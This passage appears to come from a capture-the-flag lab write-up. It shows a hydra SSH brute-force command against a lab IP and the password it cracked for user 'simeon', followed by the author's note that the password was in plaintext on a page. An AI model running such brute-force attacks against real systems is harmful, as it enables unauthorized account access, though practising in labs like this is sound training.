```bash
$ hydra -l simeon -P bruteforce_list  ssh://10.10.161.63

[22][ssh] host: 10.10.161.63   login: simeon   password: scelerisque

```

I failed to notice that in the [[message-to-simeon.txt]], there is a phrase that indicates that the password for simeon is in the webpage in plaintext in [[simeon's page]] (i assumed the next step was to bruteforce simeon but only attempted files such as rockyou.txt)

Now we can log into simeon's account. Let us use this account to get [[COMPUTER INFORMATION]]

